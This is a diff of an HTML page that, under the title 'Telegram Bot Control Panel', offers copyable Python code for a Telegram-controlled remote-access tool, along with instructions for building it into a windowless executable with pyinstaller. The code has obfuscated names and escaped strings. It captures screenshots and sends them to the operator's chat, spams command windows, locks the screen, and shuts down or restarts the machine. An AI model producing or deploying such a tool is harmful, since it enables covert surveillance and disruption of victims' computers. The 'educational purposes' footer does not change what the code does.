@@ -1,22 +1,227 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Голосовая связь</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Bot Control Panel</title>
     <style>
-        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
-        button { padding: 10px 20px; margin: 10px; font-size: 16px; }
-        #speakBtn { background-color: #4CAF50; color: white; }
-        #listenBtn { background-color: #2196F3; color: white; }
-        #status { margin: 20px 0; padding: 10px; border-radius: 5px; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        
+        .warning {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 5px;
+            border-left: 5px solid #ffc107;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        
+        .instruction {
+            background-color: #e7f5ff;
+            color: #1864ab;
+            padding: 15px;
+            border-radius: 5px;
+            border-left: 5px solid #4dabf7;
+            margin-bottom: 20px;
+        }
+        
+        .code-container {
+            position: relative;
+            background-color: #282c34;
+            border-radius: 8px;
+            padding: 20px;
+            color: #abb2bf;
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            overflow-x: auto;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+        
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background-color 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background-color: #45a049;
+        }
+        
+        .keyword {
+            color: #c678dd;
+        }
+        
+        .string {
+            color: #98c379;
+        }
+        
+        .comment {
+            color: #5c6370;
+            font-style: italic;
+        }
+        
+        .function {
+            color: #61afef;
+        }
+        
+        .variable {
+            color: #e06c75;
+        }
+        
+        h1 {
+            color: #2c3e50;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        h2 {
+            color: #3b5bdb;
+            margin-top: 30px;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #7f8c8d;
+            font-size: 14px;
+        }
+        
+        .command {
+            background-color: #495057;
+            color: #f8f9fa;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            display: inline-block;
+            margin: 5px 0;
+        }
     </style>
 </head>
 <body>
-    <h1>Голосовая связь</h1>
-    <button id="speakBtn">Говорить</button>
-    <button id="listenBtn">Слушать</button>
-    <div id="status">Статус: Не подключено</div>
-    <audio id="audioElement" autoplay></audio>
+    <h1>Telegram Bot Control Panel</h1>
+    
+    <div class="warning">
+        ⚠️ Не забудь вставить токен бота, получить его можно в @botfather
+    </div>
+    
+    <div class="instruction">
+        <h2>Инструкция по созданию исполняемого файла</h2>
+        <p>1. Установите pyinstaller:</p>
+        <div class="command">pip install pyinstaller</div>
+        
+        <p>2. Создайте исполняемый файл без консоли:</p>
+        <div class="command">pyinstaller --noconsole --onefile ваш_файл.py</div>
+        
+        <p>Готовый файл будет в папке dist</p>
+    </div>
+    
+    <h2>Код Telegram бота</h2>
+    
+    <div class="code-container">
+        <button class="copy-btn" onclick="copyCode()">Копировать код</button>
+        <pre><code><span class="keyword">import</span> os, subprocess, pyautogui
+<span class="keyword">from</span> telegram <span class="keyword">import</span> Update, ReplyKeyboardMarkup
+<span class="keyword">from</span> telegram.ext <span class="keyword">import</span> Updater, CommandHandler, MessageHandler, Filters, CallbackContext
 
-    <script src="app.js"></script>
+TOKEN = <span class="string">"YOUR_TELEGRAM_BOT_TOKEN"</span>
+
+<span class="keyword">def</span> <span class="function">_1</span>():
+    _2 = [
+        [<span class="string">'\u0421\u043a\u0440\u0438\u043d\u0448\u043e\u0442'</span>, <span class="string">'\u0411\u043b\u043e\u043a\u043d\u043e\u0442'</span>, <span class="string">'\u0421\u0438\u0441\u0442\u0435\u043c\u0430'</span>],
+        [<span class="string">'\u0426\u0435\u043d\u0442\u0440 \u044d\u043a\u0440\u0430\u043d\u0430'</span>, <span class="string">'\u0423\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043c\u044b\u0448\u043a\u043e\u0439'</span>, <span class="string">'CMD spam'</span>],
+        [<span class="string">'\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0444\u0430\u0439\u043b'</span>, <span class="string">'\u0417\u0430\u043a\u0440\u044b\u0442\u044c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u043a\u043d\u043e'</span>, <span class="string">'\u0417\u0430\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u0430\u0442\u044c'</span>],
+        [<span class="string">'\u0412\u044b\u043a\u043b\u044e\u0447\u0438\u0442\u044c'</span>, <span class="string">'\u041f\u0435\u0440\u0435\u0437\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u044c'</span>, <span class="string">'\u0421\u043f\u044f\u0449\u0438\u0439 \u0440\u0435\u0436\u0438\u043c'</span>]
+    ]
+    <span class="keyword">return</span> ReplyKeyboardMarkup(_2, resize_keyboard=<span class="keyword">True</span>)
+
+<span class="keyword">def</span> <span class="function">_3</span>(update: Update, _4: CallbackContext):
+    update.message.reply_text(<span class="string">"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435:"</span>, reply_markup=_1())
+
+<span class="keyword">def</span> <span class="function">_5</span>(update: Update, _6: CallbackContext):
+    _7 = update.message.text
+    _8 = update.message.chat_id
+    <span class="keyword">try</span>:
+        <span class="keyword">if</span> _7 == <span class="string">'\u0421\u043a\u0440\u0438\u043d\u0448\u043e\u0442'</span>:
+            _9 = pyautogui.screenshot()
+            _9.save(<span class="string">'_10.png'</span>)
+            _6.bot.send_photo(chat_id=_8, photo=open(<span class="string">'_10.png'</span>, <span class="string">'rb'</span>))
+            os.remove(<span class="string">'_10.png'</span>)
+        <span class="keyword">elif</span> _7 == <span class="string">'\u0411\u043b\u043e\u043a\u043d\u043e\u0442'</span>:
+            subprocess.Popen(<span class="string">'notepad.exe'</span>)
+        <span class="keyword">elif</span> _7 == <span class="string">'\u0421\u0438\u0441\u0442\u0435\u043c\u0430'</span>:
+            subprocess.Popen(<span class="string">'systeminfo'</span>, shell=<span class="keyword">True</span>)
+        <span class="keyword">elif</span> _7 == <span class="string">'\u0426\u0435\u043d\u0442\u0440 \u044d\u043a\u0440\u0430\u043d\u0430'</span>:
+            _11, _12 = pyautogui.size()
+            pyautogui.moveTo(_11/2, _12/2)
+        <span class="keyword">elif</span> _7 == <span class="string">'\u0423\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043c\u044b\u0448\u043a\u043e\u0439'</span>:
+            pyautogui.move(10, 10)
+        <span class="keyword">elif</span> _7 == <span class="string">'CMD spam'</span>:
+            <span class="keyword">for</span> _ <span class="keyword">in</span> range(10):
+                subprocess.Popen(<span class="string">'start cmd'</span>, shell=<span class="keyword">True</span>)
+        <span class="keyword">elif</span> _7 == <span class="string">'\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0444\u0430\u0439\u043b'</span>:
+            <span class="keyword">with</span> open(<span class="string">'_13.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> _14:
+                _14.write(<span class="string">'\u042d\u0442\u043e \u043d\u043e\u0432\u044b\u0439 \u0444\u0430\u0439\u043b, \u0441\u043e\u0437\u0434\u0430\u043d\u043d\u044b\u0439 \u0431\u043e\u0442\u043e\u043c'</span>)
+            _6.bot.send_document(chat_id=_8, document=open(<span class="string">'_13.txt'</span>, <span class="string">'rb'</span>))
+            os.remove(<span class="string">'_13.txt'</span>)
+        <span class="keyword">elif</span> _7 == <span class="string">'\u0417\u0430\u043a\u0440\u044b\u0442\u044c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u043a\u043d\u043e'</span>:
+            pyautogui.hotkey(<span class="string">'alt'</span>, <span class="string">'f4'</span>)
+        <span class="keyword">elif</span> _7 == <span class="string">'\u0417\u0430\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u0430\u0442\u044c'</span>:
+            <span class="keyword">if</span> os.name == <span class="string">'nt'</span>:
+                os.system(<span class="string">'rundll32.exe user32.dll,LockWorkStation'</span>)
+        <span class="keyword">elif</span> _7 == <span class="string">'\u0412\u044b\u043a\u043b\u044e\u0447\u0438\u0442\u044c'</span>:
+            os.system(<span class="string">'shutdown /s /t 1'</span>)
+        <span class="keyword">elif</span> _7 == <span class="string">'\u041f\u0435\u0440\u0435\u0437\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u044c'</span>:
+            os.system(<span class="string">'shutdown /r /t 1'</span>)
+        <span class="keyword">elif</span> _7 == <span class="string">'\u0421\u043f\u044f\u0449\u0438\u0439 \u0440\u0435\u0436\u0438\u043c'</span>:
+            os.system(<span class="string">'rundll32.exe powrprof.dll,SetSuspendState 0,1,0'</span>)
+        update.message.reply_text(<span class="string">f"\u0414\u0435\u0439\u0441\u0442\u0432\u0438\u0435 '{_7}' \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u043e"</span>, reply_markup=_1())
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+        update.message.reply_text(<span class="string">f"\u041e\u0448\u0438\u0431\u043a\u0430: {str(e)}"</span>, reply_markup=_1())
+
+<span class="keyword">def</span> <span class="function">_15</span>():
+    _16 = Updater(TOKEN, use_context=<span class="keyword">True</span>)
+    _17 = _16.dispatcher
+    _17.add_handler(CommandHandler(<span class="string">"start"</span>, _3))
+    _17.add_handler(MessageHandler(Filters.text & ~Filters.command, _5))
+    _16.start_polling()
+    _16.idle()
+
+<span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:
+    _15()</code></pre>
+    </div>
+    
+    <footer>
+        <p>© 2023 Telegram Bot Control Panel | Для образовательных целей</p>
+    </footer>
+
+    <script>
+        function copyCode() {
+            const code = document.querySelector('.code-container code').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                const btn = document.querySelector('.copy-btn');
+                btn.textContent = 'Скопировано!';
+                setTimeout(() => {
+                    btn.textContent = 'Копировать код';
+                }, 2000);
+            });
+        }
+    </script>
 </body>
-</html>
+    </html>
